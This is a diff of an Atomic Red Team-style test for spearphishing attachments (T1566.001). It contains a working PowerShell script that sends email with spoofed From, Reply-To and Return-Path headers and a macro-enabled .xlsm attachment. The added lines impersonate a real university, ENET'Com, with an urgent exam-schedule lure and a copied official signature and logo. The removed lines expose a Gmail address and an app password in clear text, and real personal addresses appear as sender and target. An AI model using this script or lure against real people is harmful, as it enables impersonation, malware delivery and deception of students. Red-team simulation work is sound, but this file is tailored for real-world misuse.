@@ -1,99 +1,109 @@
 attack_technique: T1566.001
 display_name: 'Phishing: Spearphishing Attachment'
+
 atomic_tests:
-  - name: Simulate sending a phishing email with a malicious attachment via SMTP with spoofed headers
-    auto_generated_guid: custom-guid-phishing-attachment
+  - name: Simulate sending a phishing email with a malicious attachment via SMTP with spoofed headers (ENET'Com themed)
+    auto_generated_guid: custom-guid-phishing-attachment-enetcom
     description: |
-      This test simulates sending a phishing email with a malicious attachment by spoofing headers instead of the From field.
+      This test simulates sending a spearphishing email from ENET'Com University with a spoofed sender address.
+      The email includes a convincing message and an official university signature to entice the recipient into opening the attached document.
       WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
+    
     supported_platforms:
       - windows
+
     input_arguments:
       smtp_server:
         description: SMTP server to use
         type: string
-        default: "smtp.gmail.com"  # Use Gmail's SMTP server
+        default: "localhost"  # Use localhost for testing (e.g., hMailServer or Postfix)
+      
       smtp_port:
         description: SMTP port
         type: integer
-        default: 587  # Standard port for Gmail with TLS
-      sender_email:
-        description: Real email address for SMTP authentication
-        type: string
-        default: "chaymaoumayma2003@gmail.com"  # Replace with your Gmail account
+        default: 25  # Standard SMTP port for hMailServer
+      
       sender_visible_email:
         description: Email address to spoof in the "From" header
         type: string
-        default: '"IEEE Notification" <chaymabouattour@ieee.org>'  # Spoofed email address
+        default: '"ENET''Com University - Academic Affairs" <academic@enetcom.rnu.tn>'  # Official-looking sender
+      
       reply_to_email:
         description: Reply-To email address
         type: string
-        default: "chaymaoumayma2003@gmail.com"  # Falsified Reply-To address
-      return_path:
-        description: Return-Path email address for spoofing
-        type: string
-        default: "chaymaoumayma2003@gmail.com"  # Falsified Return-Path
+        default: "chaymaoumayma2003@gmail.com"  # Real attacker-controlled email for replies
+      
       recipient_email:
         description: Recipient email address
         type: string
-        default: "victim2025@outlook.fr"  # Replace with the actual recipient's email address
+        default: "oumaymakabadou2@gmail.com"  # Replace with actual target email
+      
       subject:
         description: Customized subject of the email
         type: string
-        default: "Urgent: Please review the attached document"
+        default: "[Urgent] Final Exam Schedule Attached - Immediate Review Required"
+      
       body:
         description: Customized body content of the email
         type: string
         default: |
-          Dear User,<br>
-          We have detected unusual activity on your account. To secure your data, please review the attached document as soon as possible.<br>
-          Thank you for your cooperation.<br>
+          Dear Student,<br><br>
+          Please find attached the finalized exam schedule for the upcoming semester.<br>
+          Your timely review and confirmation are required by the Academic Office.<br><br>
           Best regards,<br>
-          The Security Team
+          <strong>Academic Affairs Department</strong><br>
+          ENET'Com University<br>
+          Contact: academic@enetcom.rnu.tn<br><br>
+
+          <!-- BEGIN SIGNATURE -->
+          <div style="font-family: Arial, sans-serif; font-size: 12px; color: #333333; border-top: 1px solid #dddddd; padding-top: 8px; margin-top: 16px;">
+            <strong>ENET'Com University</strong><br>
+            National School of Electronics and Telecommunications of Sousse<br>
+            Route de Gabès, km 0.5 - BP 1173, Sousse, Tunisia<br>
+            Tel: +216 73 500 500 | Website: <a href="https://www.enetcom.rnu.tn " style="color: #0066cc;">www.enetcom.rnu.tn</a><br>
+            <img src="https://www.enetcom.rnu.tn/wp-content/uploads/2023/04/logo-enetcom.png " alt="ENET'Com Logo" width="100" style="margin-top: 5px;">
+          </div>
+          <!-- END SIGNATURE -->
+      
       attachment_path:
         description: Path to the malicious attachment
         type: string
-        default: "C:\\temp\\PhishingAttachment.xlsm"  # Ensure this matches the actual path
-      app_password:
-        description: Application password for SMTP authentication
-        type: string
-        default: "wbae yozc iyut rykk"  # Generated application password
+        default: "C:\\temp\\Final_Exam_Schedule.xlsm"  # Rename to appear legitimate
+      
       log_file:
         description: Path to the log file
         type: string
-        default: "C:\\Users\\chaym\\phishing_script.log"  # Path for logging the result
+        default: "C:\\Users\\chaym\\phishing_script.log"
+
     executor:
       name: powershell
       elevation_required: false
       command: |
         $smtpServer = "#{smtp_server}"
         $smtpPort = #{smtp_port}
-        $senderEmail = "#{sender_email}"  # Real address for SMTP authentication
-        $senderVisibleEmail = "#{sender_visible_email}"  # Spoofed address visible in the "From" field
-        $replyToEmail = "#{reply_to_email}"  # Falsified Reply-To address
-        $returnPath = "#{return_path}"  # Falsified Return-Path
+        $senderVisibleEmail = "#{sender_visible_email}"  # Spoofed visible From address
+        $replyToEmail = "#{reply_to_email}"
         $recipientEmail = "#{recipient_email}"
         $subject = "#{subject}"
         $body = "#{body}"
         $attachmentPath = "#{attachment_path}"
-        $app_password = "#{app_password}"
 
-        # Create a MailMessage object
+        # Create MailMessage object
         $mailMessage = New-Object System.Net.Mail.MailMessage
-        $mailMessage.From = New-Object System.Net.Mail.MailAddress($senderEmail)  # Real address for authentication
+        $mailMessage.From = New-Object System.Net.Mail.MailAddress("#{sender_visible_email}")
         $mailMessage.To.Add($recipientEmail)
         $mailMessage.Subject = $subject
         $mailMessage.Body = $body
         $mailMessage.IsBodyHtml = $true
 
-        # Add custom headers for spoofing
+        # Add spoofed headers
         $mailMessage.Headers.Add("Reply-To", $replyToEmail)
-        $mailMessage.Headers.Add("Return-Path", $returnPath)  # Falsified Return-Path
+        $mailMessage.Headers.Add("Return-Path", "#{reply_to_email}")
         $mailMessage.Headers.Add("X-Priority", "1")
         $mailMessage.Headers.Add("X-MSMail-Priority", "High")
         $mailMessage.Headers.Add("Importance", "High")
 
-        # Add attachment
+        # Attach malicious file if it exists
         if (Test-Path $attachmentPath) {
             $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
             $mailMessage.Attachments.Add($attachment)
@@ -104,15 +114,13 @@ atomic_tests:
 
         # Configure SMTP client
         $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
-        $smtpClient.EnableSsl = $true  # Enable SSL for Gmail
-        $securePassword = ConvertTo-SecureString "$app_password" -AsPlainText -Force
-        $smtpClient.Credentials = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)
+        $smtpClient.EnableSsl = $false
 
-        # Send the email
+        # Send email
         try {
             $smtpClient.Send($mailMessage)
-            Write-Host "✅ Email sent successfully."
-            
+            Write-Host "✅ Phishing email sent successfully from ENET'Com University."
+
             # Log the result
             $logEntry = "Email sent to $recipientEmail successfully at $(Get-Date)"
             Add-Content -Path "#{log_file}" -Value $logEntry
